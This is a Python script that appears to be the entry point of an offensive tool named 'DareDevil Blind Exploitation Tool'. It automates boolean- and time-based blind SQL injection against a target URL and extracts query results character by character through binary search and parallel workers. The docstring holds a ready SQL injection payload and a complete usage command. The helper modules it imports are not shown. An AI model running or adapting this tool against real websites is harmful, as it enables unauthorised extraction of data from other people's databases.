#!/usr/bin/env python

'''
DareDevil Blind Exploitation Tool

python blind.py \
--target="http://sub.domain.tld/path/file.ext?sqli={}" \
--vector="' or case when (ascii(substr(({query}),{inc},1))<{search}) then 1 else 0 end and '1'='1" \
--query="select version()" \
--cookie="COOKIE=VALUE;" \
--regex-true="string exists if condition is true" \
--regex-false="string exists if condition is false" \
--exploit=boolean
'''

import sync
import argparse
import logging
import log
import search
import http
import model
import query
import cmp
import copy
import exploit

def parse_args():
    description = 'DareDevil Blind Exploitation Tool'
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument('--query', metavar='evil', dest='query',
                        type=str, help='query')
    parser.add_argument('--vector', metavar='{query} {inc} {search}',
                        dest='vector', type=str, help='vector')
    parser.add_argument('--target', metavar='sub.domain.tld', dest='target',
                        type=str, help='target url')
    parser.add_argument('--data', metavar='post', dest='data',
                        type=str, help='post data', default=None)
    parser.add_argument('--cookies', metavar='cookies', dest='cookie',
                        type=str, help='cookies', default='')
    parser.add_argument('--workers', metavar='workers', dest='workers',
                        type=int, help='workers', default=10)
    parser.add_argument('--length', metavar='length', dest='length',
                        type=int, help='length', default=16)
    parser.add_argument('--offset', metavar='offset', dest='offset',
                        type=int, help='offset', default=1)
    parser.add_argument('--verbose', action='store_true', dest='verbose',
                        help='be verbose')
    parser.add_argument('--regex-true', metavar='true', dest='true',
                        type=str, help='true condition', default=None)
    parser.add_argument('--regex-false', metavar='false', dest='false',
                        type=str, help='false condition', default=None)
    parser.add_argument('--threshold', metavar='seconds', dest='threshold',
                        type=int, help='true condition', default=5)
    parser.add_argument('--exploit', metavar='type', dest='exploit', type=str,
                        help='exploit type', choices=['boolean', 'time'])
    args = parser.parse_args()

    args.cookies = {}
    for cookie in filter(lambda _: _.strip()!='', args.cookie.split(';')):
        k,v = cookie.split('=',1)
        args.cookies[k]=v

    if not args.target:
        parser.error('no target')

    if not args.vector:
        parser.error('no vector')

    if not args.query:
        parser.error('no query')

    return args

if __name__ == "__main__":
    args = parse_args()
    if args.verbose:
        level=logging.DEBUG
    else:
        level=logging.INFO
    log.log(level)

    ctx = model.Context(target=args.target,
                        query=args.query, 
                        vector=args.vector,
                        session=http.Session(cookies=args.cookies))

    if args.exploit == 'boolean':
        xargs = [cmp.Regex(args.true, args.false)]
        type = query.boolean
    elif args.exploit == 'time':
        type = query.time
        xargs = [args.threshold]
    else:
        raise ValueError()

    if args.data is None:
        fetch = http.get
    else:
        fetch = http.post

    results = exploit.exploit(ctx,
                              search.binary,
                              type,
                              fetch,
                              xargs,
                              offset=args.offset,
                              length=args.length,
                              workers=args.workers)
    print ''.join(results)
